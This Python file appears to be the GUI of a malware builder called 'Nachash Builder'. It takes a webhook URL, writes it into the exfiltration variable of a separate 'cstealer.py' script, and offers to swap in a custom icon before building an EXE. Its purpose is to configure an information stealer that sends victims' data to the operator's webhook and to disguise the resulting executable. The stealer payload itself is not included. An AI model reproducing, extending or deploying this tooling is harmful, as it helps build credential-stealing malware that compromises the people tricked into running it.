import os
import shutil
import customtkinter as ctk
from tkinter import messagebox, filedialog, Label
from PIL import Image, ImageTk, ImageSequence

# Ana pencereyi ayarlama
ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title("Nachash Builder ~ Version 10.2")
app.geometry("400x240")
app.resizable(False, False)

# Simge dosyasını ayarlama
icon_path = "Nachash_assets\\img\\logo.ico"
if os.path.exists(icon_path):
    app.iconbitmap(icon_path)
else:
    print(f"Icon file not found: {icon_path}")

# Pencereyi ekran ortalaması
app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")

# Webhook doğrulama
def validate_webhook(webhook):
    return 'api/webhooks' in webhook

# Webhook değiştirme
def replace_webhook(webhook):
    file_path = 'cstealer.py'
    if not os.path.exists(file_path):
        messagebox.showerror("Error", "The file 'cstealer.py' does not exist.")
        return

    with open(file_path, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith('h00k ='):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, 'w', encoding='utf-8') as file:
        file.writelines(lines)

# İkon seçme
def select_icon():
    icon_path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    return icon_path

# İkon ekleme sorusu
def add_icon():
    response = messagebox.askquestion("Add Icon", "Do you want to add an icon?")
    return response == 'yes'

# GIF animasyonunu ayarlama
gif_path = "Nachash_assets\\img\\ss1.gif"
if not os.path.exists(gif_path):
    print(f"GIF file not found: {gif_path}")
    gif_path = None

if gif_path:
    gif = Image.open(gif_path)
    frames = [ImageTk.PhotoImage(frame) for frame in ImageSequence.Iterator(gif)]

    def update_frame(ind):
        frame = frames[ind]
        ind = (ind + 1) % len(frames)
        gif_label.configure(image=frame)
        app.after(100, update_frame, ind)

    gif_label = Label(app)
    gif_label.place(x=0, y=0, relwidth=1, relheight=1)
    app.after(0, update_frame, 0)
else:
    gif_label = Label(app, text="GIF file not found")
    gif_label.place(x=0, y=0, relwidth=1, relheight=1)

# Giriş alanı
entry = ctk.CTkEntry(app, placeholder_text="Enter your webhook")
entry.pack(pady=50)

# Build EXE butonu
def on_build_exe():
    webhook = entry.get()
    if validate_webhook(webhook):
        replace_webhook(webhook)
        if add_icon():
            icon_path = select_icon()
            if icon_path:
                shutil.copy(icon_path, "Nachash_assets\\img\\logo.ico")
                messagebox.showinfo("Success", "Icon added and webhook replaced successfully!")
            else:
                messagebox.showerror("Error", "No icon file selected.")
        else:
            messagebox.showinfo("Success", "Webhook replaced successfully!")
    else:
        messagebox.showerror("Error", "Invalid webhook URL")

button = ctk.CTkButton(app, text="Build EXE", command=on_build_exe)
button.pack(pady=40)

# Ana döngüyü başlatma
app.mainloop()
